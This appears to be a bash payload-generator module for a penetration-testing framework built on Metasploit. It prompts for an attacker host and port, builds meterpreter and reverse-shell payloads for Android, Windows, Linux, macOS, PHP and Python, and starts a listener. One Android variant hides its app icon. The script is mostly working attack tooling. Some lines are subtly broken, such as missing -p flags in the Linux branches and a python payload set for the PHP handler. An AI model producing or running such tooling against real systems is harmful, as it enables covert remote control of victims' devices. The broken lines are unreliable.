#!/bin/bash

set +x

# Colors

C0="$(printf '\033[90m')"
C1="$(printf '\033[91m')"
C2="$(printf '\033[92m')"
C3="$(printf '\033[93m')"
C4="$(printf '\033[1;94m')"
R0="$(printf '\033[00m')"
R1="$(printf '\033[01m')"
R3="$(printf '\033[03m')"
R4="$(printf '\033[04m')"

# Sign

r0SIGN="${C1}(${R0}>${C1})${R0}"
r1SIGN="${C1}(${R0}!${C1})${R0}"

g0SIGN="${C2}(${R0}>${C2})${R0}"
g1SIGN="${C2}(${R0}!${C2})${R0}"

b0SIGN="${C4}(${R0}>${C4})${R0}"
b1SIGN="${C4}(${R0}!${C4})${R0}"


if ! hash msfconsole msfvenom &> /dev/null
then
printf "${C1}\e[1mE:${R0} Unable to run payload module right now Cause :\n"
printf "${C1}\e[1mE:${R0} Metasploit was not Installed yet (psfconsole)\n"
exit 1
fi


input=$input

rstring()
{
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-32} | head -n 1
}

help() {
echo -e "\nNote: This is the IP address of the attacker (You)
\e[4mpsf\e[0m set (\e[91mpayload/lhost\e[0m) > set lhost \e[94m127.0.0.1\e[0m \e[1m─────┐
\e[0m\e[4mmsf\e[0m > set lhost \e[7;94m127.0.0.1\e[0m \e[1m◂────────────────────────┘\e[0m\n"

echo -e "Note: This is the port to communicate back to the attacker.
\e[4mpsf\e[0m set (\e[91mpayload/lport\e[0m) > set lport \e[94m4444\e[0m \e[1m─────┐
\e[0m\e[4mmsf\e[0m > set lport \e[7;94m4444\e[0m \e[1m◂────────────────────────┘\e[0m\n"

echo -e "Note: This is the port to communicate back to the attacker,
but it little different if you have forwarding port then use it.
otherwise leave it blank.
\e[4mpsf\e[0m set (\e[91mpayload/fport\e[0m) > set fport \e[94m4444\e[0m \e[1m─────┐
\e[0m\e[4mmsf\e[0m > set lport \e[7;94m4444\e[0m \e[1m◂────────────────────────┘\e[0m\n"
}

CHOOSE() {
  if [[ $input == [1/2] ]]
then
NDIR=$(printf "android.payload.$(rstring 10).apk")
elif [[ $input == "3" ]]
then
DIR=$(printf "windows.payload.$(rstring 10).exe")
elif [[ $input == [4/5] ]]
then
NDIR=$(printf "linux.payload.$(rstring 10)")
elif [[ $input == [6/7] ]]
then
NDIR=$(printf "mac.payload.$(rstring 10).bin")
elif [[ $input == "8" ]]
then
NDIR=$(printf "php.payload.$(rstring 10).php")
elif [[ $input == "9" ]]
then
NDIR=$(printf "python.payload.$(rstring 10).py")
fi
}

CHOOSE

if [[ $input == "10" ]]
then
   if [[ -f "resource" ]]
   then
   printf "${g0SIGN} Starting msfconsole listener ...\r"
   msfconsole -q -r resource
else
   echo "${r1SIGN} No last created payload found."
   exit 1
   fi
fi


while true
do
printf "${R4}psf${R0} set (${C1}payload/lhost${R0}) > "
   read lhost
   cmd="$lhost"

if [[ ${lhost} == "set lhost"* ]]
then
lhost="${lhost#set lhost }"
echo -e "${g0SIGN} You set it local host to ${lhost}"
break

elif [[ ${lhost} == "help" || ${lhost} == "?" ]]
then
help

else
if [ ${#cmd} -gt 0 ]
then
echo "${r0SIGN} Unsatisfied command ‘${cmd}’ :: execute '?'/'help'"
fi
fi
done

while true
do
printf "${R4}psf${R0} set (${C1}payload/lport${R0}) > "
   read lport
   cmd="$lport"

if [[ ${lport} == "set lport"* ]]
then
lport="${lport#set lport }"
echo -e "${g0SIGN} You set it local port to ${lport}"
break

elif [[ ${lport} == "help" || ${lport} == "?" ]]
then
help

else
if [ ${#cmd} -gt 0 ]
then
echo "${r0SIGN} Unsatisfied command ‘${cmd}’ :: execute '?'/'help'"
fi
fi
done

while true
do
printf "${R4}psf${R0} set (${C1}payload/fport${R0}) > "
   read fport
   cmd="$fport"

if [[ ${fport} == "set fport"* ]]
then
fport="${fport#set fport }"
echo -e "${g0SIGN} You set it forwarding port to ${fport}"
break

elif [[ ${#fport} -lt 1 ]]
then
fport=$lport
echo -e "${g0SIGN} You leave it blank we set port to lport ${lport}"
break

elif [[ ${fport} == "help" || ${fport} == "?" ]]
then
help

else
if [ ${#cmd} -gt 0 ]
then
echo "${r0SIGN} Unsatisfied command ‘${cmd}’ :: execute '?'/'help'"
fi
fi
done

android_tcp=$(
printf "
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost $lhost
set lport $lport
exploit"
)

windows_tcp=$(
printf "use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost $lhost
set lport $lport
exploit"
)

linux_x86_tcp=$(
printf "use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set lhost $lhost
set lport $lport
exploit"
)

linux_x64_tcp=$(
printf "use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost $lhost
set lport $lport
exploit"
)

mac_x86_tcp=$(
printf "use exploit/multi/handler
set payload osx/x86/shell_reverse_tcp
set lhost $lhost
set lport $lport
exploit"
)

mac_x64_tcp=$(
printf "use exploit/multi/handler
set payload osx/x64/shell_reverse_tcp
set lhost $lhost
set lport $lport
exploit"
)

php_tcp=$(
printf "use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set lhost $lhost
set lport $lport
exploit"
)

python_tcp=$(
printf "use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set lhost $lhost
set lport $lport
exploit"
)

listenerASK() {
echo -e "$b0SIGN Want to start msfconsole listener just type : start"
printf "${R4}psf${R0} use (${C1}payload/listener${R0}) > "
read a1
if [[ $a1 == "start" ]]
then
:
else
input=back
fi
}

meterpreter() {
cat <<- CONF > resource
$1
CONF

printf "${g0SIGN} Starting msfconsole listener ...\r"
msfconsole -q -r resource
}

sleeptime() {
sleep 0.03
}

progress() {
sleeptime
printf "${C0}————————————————————————${R0}              \r"
sleeptime
printf "${C4}—${C0}———————————————————————${R0}         \r"
sleeptime
printf "${C4}——${C0}——————————————————————${R0}         \r"
sleeptime
printf "${C4}———${C0}—————————————————————${R0}         \r"
sleeptime
printf "${C4}————${C0}————————————————————${R0}         \r"
sleeptime
printf "${C4}—————${C0}———————————————————${R0}         \r"
sleeptime
printf "${C4}——————${C0}——————————————————${R0}         \r"
sleeptime
printf "${C4}———————${C0}—————————————————${R0}         \r"
sleeptime
printf "${C4}————————${C0}————————————————${R0}         \r"
sleeptime
printf "${C4}—————————${C0}———————————————${R0}         \r"
sleeptime
printf "${C4}——————————${C0}——————————————${R0}         \r"
sleeptime
printf "${C4}———————————${C0}—————————————${R0}         \r"
sleeptime
printf "${C4}————————————${C0}————————————${R0}         \r"
sleeptime
printf "${C4}—————————————${C0}———————————${R0}         \r"
sleeptime
printf "${C4}——————————————${C0}——————————${R0}         \r"
sleeptime
printf "${C4}———————————————${C0}—————————${R0}         \r"
sleeptime
printf "${C4}————————————————${C0}————————${R0}         \r"
sleeptime
printf "${C4}—————————————————${C0}———————${R0}         \r"
sleeptime
printf "${C4}——————————————————${C0}——————${R0}         \r"
sleeptime
printf "${C4}———————————————————${C0}—————${R0}         \r"
sleeptime
printf "${C4}————————————————————${C0}————${R0}         \r"
sleeptime
printf "${C4}—————————————————————${C0}———${R0}         \r"
sleeptime
printf "${C4}——————————————————————${C0}——${R0}         \r"
sleeptime
printf "${C4}————————————————————————${R0}              \r"                 sleeptime
}

HIDE(){ echo -en "\033[?25l";}
NORM(){ echo -en "\033[?12l\033[?25h";}
C1="\e[92m"
C2="\e[0m"

spinner() {
local pid=$!
local delay=0.0350

while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
for progressbar in progress
do
        HIDE
        ${progressbar[@]}
        sleep $delay
done
done
echo -e "${g0SIGN} payload saved to ${HOME}/${NDIR}"
NORM                                                                        printf "Complete ...!                           \n"
}

readOPT() {
  if [[ $input == "1" ]]
then
( msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$fport R > $HOME/$NDIR
) &> /dev/null & spinner
listenerASK
meterpreter "$android_tcp"

elif [[ $input == "2" ]]
then
( msfvenom -p android/meterpreter/reverse_tcp AndroidHideAppIcon=true AndroidMeterpreterDebug=true AndroidWakelock=true lhost=$lhost lport=$fport -o $HOME/$NDIR
) &> /dev/null & spinner
listenerASK
meterpreter "$android_tcp"

elif [[ $input == "3" ]]
then
( msfvenom -p windows/meterpreter/reverse_tcp lhost=$lhost lport=$fport -o $HOME/$NDIR
) &> /dev/null & spinner
listenerASK
meterpreter "$windows_tcp"

elif [[ $input == "4" ]]
then
( msfvenom linux/x86/meterpreter/reverse_tcp lhost=$lhost lport=$fport -o $HOME/$NDIR
) &> /dev/null & spinner
listenerASK
meterpreter "$linux_x86_tcp"

elif [[ $input == "5" ]]
then
( msfvenom linux/x64/meterpreter/reverse_tcp lhost=$lhost lport=$fport -o $HOME/$NDIR
) &> /dev/null & spinner
listenerASK
meterpreter "$linux_x64_tcp"

elif [[ $input == "6" ]]
then
( msfvenom -p osx/x86/shell_reverse_tcp lhost=$lhost lport=$fport -o $HOME/$NDIR
) &> /dev/null & spinner
listenerASK
meterpreter "$mac_x86_tcp"

elif [[ $input == "7" ]]
then
( msfvenom -p osx/x64/shell_reverse_tcp lhost=$lhost lport=$fport -o $HOME/$NDIR
) &> /dev/null & spinner
listenerASK
meterpreter "$mac_x64_tcp"

elif [[ $input == "8" ]]
then
( msfvenom -p php/meterpreter/reverse_tcp lhost=$lhost lport=$fport -o $HOME/$NDIR
) &> /dev/null & spinner
listenerASK
meterpreter "$php_tcp"

elif [[ $input == "9" ]]
then
( msfvenom -p python/meterpreter/reverse_tcp lhost=$lhost lport=$fport -o $HOME/$NDIR
) &> /dev/null & spinner
listenerASK
meterpreter "$python_tcp"
fi
}

readOPT

rm resource &> /dev/null
